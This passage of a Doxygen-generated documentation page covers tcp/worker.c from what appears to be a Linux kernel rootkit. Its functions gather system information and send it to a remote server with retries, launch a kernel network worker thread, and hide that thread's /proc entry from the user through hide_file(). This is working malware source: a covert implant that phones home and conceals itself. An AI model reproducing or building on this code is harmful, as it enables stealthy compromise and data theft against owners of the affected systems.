<div class="ttc" id="aconfig_8h_html_aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c"><div class="ttname"><a href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a></div><div class="ttdeci">@ TCP</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00029">config.h:29</a></div></div>
<div class="ttc" id="aconfig_8h_html_af26a6d07df7d33e5973124b0ffeceb0e"><div class="ttname"><a href="../../db/d16/config_8h.html#af26a6d07df7d33e5973124b0ffeceb0e">MAX_MSG_SEND_OR_RECEIVE_ERROR</a></div><div class="ttdeci">#define MAX_MSG_SEND_OR_RECEIVE_ERROR</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00035">config.h:35</a></div></div>
<div class="ttc" id="anetwork_8c_html_a666e3b95602cc2a6ef57a2af56b0d8ef"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a666e3b95602cc2a6ef57a2af56b0d8ef">receive_from_server</a></div><div class="ttdeci">int receive_from_server(char *buffer, size_t max_len)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00200">network.c:200</a></div></div>
<div class="ttc" id="aupload_8h_html_a281121106d88af2a7aad56035f113d84"><div class="ttname"><a href="../../d3/dc0/upload_8h.html#a281121106d88af2a7aad56035f113d84">receiving_file</a></div><div class="ttdeci">bool receiving_file</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d4a/upload_8c_source.html#l00010">upload.c:10</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a2f07d7ffb76e09c83b2e6b18a88cae82" name="a2f07d7ffb76e09c83b2e6b18a88cae82"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2f07d7ffb76e09c83b2e6b18a88cae82">&#9670;&#160;</a></span>send_initial_message_with_retries()</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static bool send_initial_message_with_retries </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">
<p>send_initial_message_with_retries - Send the initial message to the server with retries. This function retrieves system information and sends it to the server. If the send fails, it retries up to MAX_MSG_SEND_OR_RECEIVE_ERROR times. Return: true on success, false on failure after retries. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00033">33</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   33</span>                                                    {</div>
<div class="line"><span class="lineno">   34</span>    <span class="keywordtype">char</span> *sysinfo = <a class="code hl_function" href="../../d1/d84/sysinfo_8c.html#a3e6842bb9a9627bd804f441c53ff6e5c">get_sysinfo</a>();</div>
<div class="line"><span class="lineno">   35</span> </div>
<div class="line"><span class="lineno">   36</span>    <span class="keywordflow">if</span> (!sysinfo) {</div>
<div class="line"><span class="lineno">   37</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;send_initial_message_with_retries: failed to get system info\n&quot;</span>);</div>
<div class="line"><span class="lineno">   38</span>        <span class="keywordflow">return</span> <span class="keyword">false</span>;</div>
<div class="line"><span class="lineno">   39</span>    }</div>
<div class="line"><span class="lineno">   40</span> </div>
<div class="line"><span class="lineno">   41</span>    <span class="keywordflow">for</span> (<span class="keywordtype">int</span> attempts = 0; attempts &lt; <a class="code hl_define" href="../../db/d16/config_8h.html#af26a6d07df7d33e5973124b0ffeceb0e">MAX_MSG_SEND_OR_RECEIVE_ERROR</a>; attempts++) {</div>
<div class="line"><span class="lineno">   42</span>        <span class="keywordflow">if</span> (<a class="code hl_function" href="../../d6/d6e/network_8c.html#a375e772b2efc7540285ea61d2c9e5694">send_to_server</a>(<a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a>, sysinfo) == <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>) {</div>
<div class="line"><span class="lineno">   43</span>            kfree(sysinfo);</div>
<div class="line"><span class="lineno">   44</span>            <span class="keywordflow">return</span> <span class="keyword">true</span>;</div>
<div class="line"><span class="lineno">   45</span>        }</div>
<div class="line"><span class="lineno">   46</span>        msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">   47</span>    }</div>
<div class="line"><span class="lineno">   48</span>    kfree(sysinfo);</div>
<div class="line"><span class="lineno">   49</span>    <span class="keywordflow">return</span> <span class="keyword">false</span>;</div>
<div class="line"><span class="lineno">   50</span>}</div>
<div class="ttc" id="anetwork_8c_html_a375e772b2efc7540285ea61d2c9e5694"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a375e772b2efc7540285ea61d2c9e5694">send_to_server</a></div><div class="ttdeci">int send_to_server(enum Protocol protocol, char *message,...)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00067">network.c:67</a></div></div>
<div class="ttc" id="asysinfo_8c_html_a3e6842bb9a9627bd804f441c53ff6e5c"><div class="ttname"><a href="../../d1/d84/sysinfo_8c.html#a3e6842bb9a9627bd804f441c53ff6e5c">get_sysinfo</a></div><div class="ttdeci">char * get_sysinfo(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d84/sysinfo_8c_source.html#l00018">sysinfo.c:18</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a043850404f54dbb1abc14ad658528669" name="a043850404f54dbb1abc14ad658528669"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a043850404f54dbb1abc14ad658528669">&#9670;&#160;</a></span>set_user_auth()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int set_user_auth </td>
          <td>(</td>
          <td class="paramtype">bool&#160;</td>
          <td class="paramname"><em>auth</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>set_user_auth - Set the user authentication status. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">auth</td><td>true to authenticate the user, false to unauthenticate. Return: 0 on success, or an error code on failure. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00022">22</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   22</span>                             {</div>
<div class="line"><span class="lineno">   23</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a> = auth;</div>
<div class="line"><span class="lineno">   24</span>    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a>;</div>
<div class="line"><span class="lineno">   25</span>}</div>
</div><!-- fragment -->
</div>
</div>
<a id="a2854e06612012f03c99698168e68c14f" name="a2854e06612012f03c99698168e68c14f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2854e06612012f03c99698168e68c14f">&#9670;&#160;</a></span>start_network_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int start_network_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>start_network_worker - Start the network worker thread. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00161">161</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  161</span>                               {</div>
<div class="line"><span class="lineno">  162</span>    <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> &amp;&amp; !IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  163</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;start_network_worker: thread already running\n&quot;</span>);</div>
<div class="line"><span class="lineno">  164</span>        <span class="keywordflow">return</span> -EBUSY;</div>
<div class="line"><span class="lineno">  165</span>    }</div>
<div class="line"><span class="lineno">  166</span> </div>
<div class="line"><span class="lineno">  167</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> =</div>
<div class="line"><span class="lineno">  168</span>        kthread_run(<a class="code hl_function" href="../../d4/d33/tcp_2worker_8c.html#a27e432a80775b74a89869a945fdd82eb">network_worker</a>, NULL, <a class="code hl_define" href="../../db/d16/config_8h.html#aa04c770744d5ff8ee6f11c8f2e34e849">NETWORK_WORKER_THREAD_NAME</a>);</div>
<div class="line"><span class="lineno">  169</span>    <span class="keywordflow">if</span> (IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  170</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;start_network_worker: failed to start thread\n&quot;</span>);</div>
<div class="line"><span class="lineno">  171</span>        <span class="keywordflow">return</span> PTR_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>);</div>
<div class="line"><span class="lineno">  172</span>    }</div>
<div class="line"><span class="lineno">  173</span> </div>
<div class="line"><span class="lineno">  174</span>    <span class="comment">// Hide the thread from the user</span></div>
<div class="line"><span class="lineno">  175</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">  176</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">  177</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a>(path);</div>
<div class="line"><span class="lineno">  178</span> </div>
<div class="line"><span class="lineno">  179</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">  180</span>}</div>
<div class="ttc" id="aconfig_8h_html_aa04c770744d5ff8ee6f11c8f2e34e849"><div class="ttname"><a href="../../db/d16/config_8h.html#aa04c770744d5ff8ee6f11c8f2e34e849">NETWORK_WORKER_THREAD_NAME</a></div><div class="ttdeci">#define NETWORK_WORKER_THREAD_NAME</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00034">config.h:34</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a187cbdb4b2755a9436a0661bc40108fb"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a></div><div class="ttdeci">int hide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00025">hide_api.c:25</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a27e432a80775b74a89869a945fdd82eb"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a27e432a80775b74a89869a945fdd82eb">network_worker</a></div><div class="ttdeci">static int network_worker(void *data)</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00106">tcp/worker.c:106</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a65d672686f8fc161c844c4c6b593f1f7"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a></div><div class="ttdeci">static struct task_struct * network_worker_thread</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00007">tcp/worker.c:7</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="af4b33ff003ec81aed0790bfcf426a025" name="af4b33ff003ec81aed0790bfcf426a025"></a>
<h2 class="memtitle"><span class="permalink"><a href="#af4b33ff003ec81aed0790bfcf426a025">&#9670;&#160;</a></span>stop_network_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int stop_network_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>stop_network_worker - Stop the network worker thread. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00185">185</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  185</span>                              {</div>
<div class="line"><span class="lineno">  186</span>    <span class="keywordflow">if</span> (!<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> || IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  187</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">  188</span>    }</div>
<div class="line"><span class="lineno">  189</span> </div>
<div class="line"><span class="lineno">  190</span>    <span class="comment">// Remove the hidden directory associated with the thread</span></div>
<div class="line"><span class="lineno">  191</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">  192</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">  193</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a>(path);</div>
<div class="line"><span class="lineno">  194</span> </div>
<div class="line"><span class="lineno">  195</span>    <span class="comment">// Stop the network worker thread</span></div>
<div class="line"><span class="lineno">  196</span>    kthread_stop(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>);</div>
<div class="line"><span class="lineno">  197</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> = NULL;</div>
<div class="line"><span class="lineno">  198</span> </div>
<div class="line"><span class="lineno">  199</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">  200</span>}</div>
<div class="ttc" id="ahide__api_8c_html_ac147abbca2116c29d3679c207b981a98"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a></div><div class="ttdeci">int unhide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00052">hide_api.c:52</a></div></div>
</div><!-- fragment -->
</div>
</div>
<h2 class="groupheader">Variable Documentation</h2>
<a id="a9701dcc09cacdca5f5952a4dfc91b2e0" name="a9701dcc09cacdca5f5952a4dfc91b2e0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9701dcc09cacdca5f5952a4dfc91b2e0">&#9670;&#160;</a></span>is_auth</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">bool is_auth = false</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00006">6</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>

</div>
</div>
<a id="a65d672686f8fc161c844c4c6b593f1f7" name="a65d672686f8fc161c844c4c6b593f1f7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a65d672686f8fc161c844c4c6b593f1f7">&#9670;&#160;</a></span>network_worker_thread</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">struct task_struct* network_worker_thread = NULL</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00007">7</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>

</div>
</div>
</div><!-- contents -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
